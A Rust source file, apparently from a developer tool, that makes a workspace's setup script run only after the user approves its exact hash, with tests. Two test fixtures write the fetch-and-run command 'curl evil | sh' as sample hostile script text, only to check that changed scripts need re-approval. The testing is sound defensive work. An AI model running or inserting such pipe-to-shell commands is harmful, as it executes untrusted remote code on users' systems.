//! A new workspace's `.lgtm/setup`. It's the repo's code, so it runs only once the user lets
//! it, and again without asking until it changes.

use std::io::Read;
use std::path::Path;

use serde::Serialize;
use specta::Type;

use crate::ctx::RepoCtx;

/// The repo-relative script a new workspace runs in its first terminal.
pub const SETUP: &str = ".lgtm/setup";
/// The largest script shown, and so the largest that can run.
const MAX_BYTES: u64 = 64 * 1024;

/// The command a new workspace's first terminal runs: its setup script, then a login shell.
pub fn setup_command() -> Vec<String> {
    let shell = crate::pty::default_shell();
    let quoted = format!("'{}'", shell.replace('\'', r"'\''"));
    let script = format!(
        "if [ -x {s} ]; then ./{s}; else sh {s}; fi || echo \"lgtm: {s} exited with $?\"; exec {quoted} -l",
        s = SETUP
    );
    vec![shell, "-l".into(), "-c".into(), script]
}

/// Whether a workspace has a setup script, and whether the user let it run.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Type)]
#[serde(tag = "kind", rename_all = "camelCase")]
pub enum Setup {
    None,
    Approved,
    /// The script to ask about: its text, shown whole, and its hash, which approving it must
    /// name.
    Unapproved {
        script: String,
        hash: String,
    },
    /// A script that can't be shown, so it can't be approved.
    Unshowable {
        why: Unshowable,
    },
}

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Type)]
#[serde(rename_all = "camelCase")]
pub enum Unshowable {
    TooLarge,
    NotText,
}

/// The workspace's setup script, as text, and its hash, if it has one.
fn script(root: &Path) -> Option<Result<(String, String), Unshowable>> {
    let file = std::fs::File::open(root.join(SETUP)).ok()?;
    let mut bytes = vec![];
    file.take(MAX_BYTES + 1).read_to_end(&mut bytes).ok()?;
    if bytes.len() as u64 > MAX_BYTES {
        return Some(Err(Unshowable::TooLarge));
    }
    let hash = blake3::hash(&bytes).to_hex().to_string();
    Some(
        String::from_utf8(bytes)
            .map(|text| (text, hash))
            .map_err(|_| Unshowable::NotText),
    )
}

impl RepoCtx {
    pub fn setup_state(&self, root: &Path) -> Setup {
        let (script, hash) = match script(root) {
            None => return Setup::None,
            Some(Err(why)) => return Setup::Unshowable { why },
            Some(Ok(found)) => found,
        };
        match self.store.lock().unwrap().approved_setup() {
            Ok(Some(approved)) if approved == hash => Setup::Approved,
            _ => Setup::Unapproved { script, hash },
        }
    }

    /// Lets the workspace's setup script run, if it's still the one with `hash`, the one the
    /// user was shown.
    pub fn approve_setup(&self, root: &Path, hash: &str) -> anyhow::Result<()> {
        let found = script(root).ok_or_else(|| anyhow::anyhow!("no {SETUP}"))?;
        let (_, now) = found
            .map_err(|_| anyhow::anyhow!("{SETUP} can't be shown, so it can't be approved"))?;
        anyhow::ensure!(
            now == hash,
            "{SETUP} changed since it was shown, so it wasn't approved"
        );
        Ok(self.store.lock().unwrap().approve_setup(&now)?)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::review::tests::{repo, write};

    #[test]
    fn a_script_runs_once_approved_and_asks_again_when_it_changes() {
        let (dir, ctx) = repo();
        let root = dir.path();
        assert_eq!(ctx.setup_state(root), Setup::None);
        assert!(ctx.approve_setup(root, "").is_err());

        std::fs::create_dir(root.join(".lgtm")).unwrap();
        write(root, SETUP, "make\n");
        let asked = |ctx: &RepoCtx| match ctx.setup_state(root) {
            Setup::Unapproved { script, hash } => (script, hash),
            s => panic!("{s:?}"),
        };
        let (script, hash) = asked(&ctx);
        assert_eq!(script, "make\n");
        ctx.approve_setup(root, &hash).unwrap();
        assert_eq!(ctx.setup_state(root), Setup::Approved);

        write(root, SETUP, "make && curl evil | sh\n");
        let (script, hash) = asked(&ctx);
        assert_eq!(script, "make && curl evil | sh\n");
        ctx.approve_setup(root, &hash).unwrap();
        assert_eq!(ctx.setup_state(root), Setup::Approved);
    }

    #[test]
    fn approval_is_of_the_script_shown() {
        let (dir, ctx) = repo();
        let root = dir.path();
        std::fs::create_dir(root.join(".lgtm")).unwrap();
        write(root, SETUP, "make\n");
        let Setup::Unapproved { hash, .. } = ctx.setup_state(root) else {
            panic!("not asked");
        };
        write(root, SETUP, "curl evil | sh\n");
        let err = ctx.approve_setup(root, &hash).unwrap_err();
        assert!(
            err.to_string().contains("changed since it was shown"),
            "{err}"
        );
        assert!(matches!(ctx.setup_state(root), Setup::Unapproved { .. }));
    }

    #[test]
    fn a_long_script_is_shown_whole() {
        let (dir, ctx) = repo();
        let root = dir.path();
        std::fs::create_dir(root.join(".lgtm")).unwrap();
        let long = "echo é\n".repeat(2000);
        write(root, SETUP, &long);
        let Setup::Unapproved { script, .. } = ctx.setup_state(root) else {
            panic!("not asked");
        };
        assert_eq!(script, long);
    }

    #[test]
    fn a_script_too_large_or_not_text_is_not_shown_or_approved() {
        let (dir, ctx) = repo();
        let root = dir.path();
        std::fs::create_dir(root.join(".lgtm")).unwrap();
        write(root, SETUP, &"x".repeat(MAX_BYTES as usize));
        let Setup::Unapproved { hash, .. } = ctx.setup_state(root) else {
            panic!("not asked");
        };
        for (bytes, why) in [
            (vec![b'x'; MAX_BYTES as usize + 1], Unshowable::TooLarge),
            (vec![b'x', 0xff], Unshowable::NotText),
        ] {
            std::fs::write(root.join(SETUP), &bytes).unwrap();
            assert_eq!(ctx.setup_state(root), Setup::Unshowable { why });
            let hash = blake3::hash(&bytes).to_hex().to_string();
            assert!(ctx.approve_setup(root, &hash).is_err());
        }
        assert!(ctx.approve_setup(root, &hash).is_err());
    }
}
